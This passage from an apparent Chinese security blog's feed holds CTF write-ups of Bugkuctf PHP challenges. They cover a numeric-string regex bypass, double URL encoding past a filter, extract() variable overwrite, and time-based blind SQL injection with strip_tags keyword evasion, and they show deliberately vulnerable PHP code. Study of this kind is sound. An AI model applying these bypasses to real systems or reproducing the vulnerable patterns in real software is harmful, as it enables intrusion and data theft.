class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;password&apos;]))&#123;</span><br><span class="line">    $password=$_GET[&apos;password&apos;];</span><br><span class="line">    if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123;</span><br><span class="line">        echo &apos;Wrong Format 1&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;;</span><br><span class="line">    if(6&gt;preg_match_all($reg,$password,$arr))&#123;</span><br><span class="line">        echo &apos;Wrong Format 2&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $c=0;</span><br><span class="line">    $ps=array(&apos;punct&apos;,&apos;digit&apos;,&apos;upper&apos;,&apos;lower&apos;);</span><br><span class="line">    foreach($ps as $pt)&#123;</span><br><span class="line">        if(preg_match(&quot;/[[:$pt:]]+/&quot;,$password))&#123;</span><br><span class="line">            $c += 1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if($c&lt;3)&#123;</span><br><span class="line">        echo &apos;Wrong Format 3&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;success&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>再看最后一个关键条件： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(&quot;42&quot; == $password) echo $flag;</span><br></pre></td></tr></table></figure><p>执行了这个语句我们才可以得到想要的flag，也就是password值等于’42’，因为类型都是字符串，所以password中的值必须等于42，结合上面的三个条件</p><p>成功的输入可以有：</p><p>42.000e%2b000000000</p><p>420.000000000000e-1</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/数字验证正则绕过/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>url二次编码绕过</title>
    <link href="https://Foxgrin.github.io//posts/9338/"/>
    <id>https://Foxgrin.github.io//posts/9338/</id>
    <published>2018-07-10T12:10:00.000Z</published>
    <updated>2018-07-10T12:17:46.498Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题，通过url二次编码绕过过滤得到flag<a id="more"></a></p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$flag=<span class="string">'flag&#123;xxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/hackerDJ/"</span>,$_GET[<span class="string">'id'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"not allowed"</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$id=urldecode($id);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">"hackerDJ"</span> == $id)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看代码第一感觉将hackerDJ进行一次URL编码即可绕过过滤 </p><p><img src="/img/url二次编码绕过/1.png" alt=""></p><p>将一次编码后的值输入</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/url二次编码绕过/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现自动转化成了hackerDJ，为什么呢，因为我们提交id值给服务器时，服务器会对id值自动url解码，所以要对hackerDJ进行二次URL编码才可以绕过 </p><p><img src="/img/url二次编码绕过/3.png" alt=""></p><p>输入二次编码后的值</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/url二次编码绕过/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功得到flag值</p>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>extract变量覆盖</title>
    <link href="https://Foxgrin.github.io//posts/25619/"/>
    <id>https://Foxgrin.github.io//posts/25619/</id>
    <published>2018-07-10T11:37:00.000Z</published>
    <updated>2018-07-10T12:04:55.616Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的一道代码审计题，通过巧妙利用file_get_contents函数特性来绕过extract变量覆盖<a id="more"></a></p><p>源代码如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line"></span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">    @$content=trim(file_get_contents($flag));</span><br><span class="line">    if($shiyan == $content)&#123;</span><br><span class="line">        echo &apos;flag&#123;xxx&#125;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &apos;oh,no&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>首先先弄明白几个函数：</p><p>extract:该函数将数组的键名作为变量名，键名对应的键值作为对应的变量值，返回值为设置成功的变量个数</p><p>也就是说这里的extract($_GET)将我们GET的参数名作为变量名，参数值作为变量值</p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;shiyan&apos;]) $$ isset($_GET[&apos;flag&apos;]))&#123;</span><br><span class="line">    $a=extract($_GET);</span><br><span class="line">    echo &apos;$a:&apos;.$a;</span><br><span class="line">    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;$shiyan:&apos;.$shiyan;</span><br><span class="line">    echo &apos;&lt;br&gt;&apos;;</span><br><span class="line">    echo &apos;$flag:&apos;.$flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功设置了两个变量，$shiyan和$flag，所以$a=2</p><p>file_get_contents：将文件内容作为字符串输出 </p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line">$content=file_get_contents($flag);</span><br><span class="line">echo $content;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这里注意file_get_contents函数里的参数是$flag，也就是说我们GET进来的参数flag值会将之前的flag值覆盖掉，从而造成变量覆盖，而我们输入的flag值如果不为文件名，函数执行错误，$content会被赋值为空 </p><p>例子如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$flag=&apos;../readme.txt&apos;;</span><br><span class="line">if(isset($_GET[&apos;flag&apos;]))&#123;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    @$content=file_get_contents($flag);</span><br><span class="line">    echo $content.&apos;1&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>要得到最终要的flag，就必须要让变量content值等于变量shiyan的值</p><p>所以我们可以让shiyan值也为空，这样flag值任意输入，只要不为文件名，就一定相等</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>另外，即使shiyan值为空，isset($shiyan)也是返回true的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$shiyan=&quot;&quot;;</span><br><span class="line">if(isset($shiyan))&#123;</span><br><span class="line">    echo &quot;11&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/extract变量覆盖/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure>]]></content>
    
    <summary type="html">
    
      代码审计
    
    </summary>
    
      <category term="代码审计" scheme="https://Foxgrin.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="php" scheme="https://Foxgrin.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-sql注入2</title>
    <link href="https://Foxgrin.github.io//posts/15184/"/>
    <id>https://Foxgrin.github.io//posts/15184/</id>
    <published>2018-07-10T11:19:00.000Z</published>
    <updated>2018-07-10T12:25:05.822Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf题库中的sql注入类题<a id="more"></a></p><p>今天继续做web类的题 </p><p><img src="/img/bugkuctf-sql2/1.png" alt=""></p><p>从题目给出的一段代码，查询各个函数的作用</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出，这段PHP程序过滤了数组里的关键字，且对我们输入的id的值进行了标签的剥离。一开始还不懂什么意思，没事我们来试一下就慢慢懂了</p><p>跟个注入题一样，输入id值为0,1时有返回值，其他无返回值</p><p>试试id=1’,id=1”,id=1’),id=1”)发现都未返回报错信息</p><p>就用基于时间的盲注试一下</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>咦，这时候居然爆出了这么一段话，再回头看看之前查询的函数，原来我们输入的id值中包含了数组中的敏感关键字，所以爆出了这段话，再看看strip_tags()这个函数，它能剥离输入字符串中的html标签，那我们试试，在敏感关键字中的出现位置加入&lt;&gt;标签 </p><p><img src="/img/bugkuctf-sql2/6.png" alt=""></p><p>果然就没有爆出之前的那段话了，又因为网页没有睡5秒，所以再试试id=1 </p><p><img src="/img/bugkuctf-sql2/7.png" alt=""></p><p>发现程序睡了5秒，说明没有对输入的id的值进行单引号或者双引号的包裹</p><p>再查查输出的列数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/bugkuctf-sql2/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现返回两列，于是接下来就是熟悉的注入 </p><p><img src="/img/bugkuctf-sql2/9.png" alt=""></p><p>爆出当前使用的数据库为sql3 </p><p><img src="/img/bugkuctf-sql2/10.png" alt=""></p><p>爆出它的数据表 </p><p><img src="/img/bugkuctf-sql2/11.png" alt=""></p><p>根据题目提示爆出id=1的hash字段值 </p>]]></content>
    
    <summary type="html">
    
      Bugkuctf-sql
    
    </summary>
    
      <category term="Bugkuctf-sql" scheme="https://Foxgrin.github.io/categories/Bugkuctf-sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
</feed>
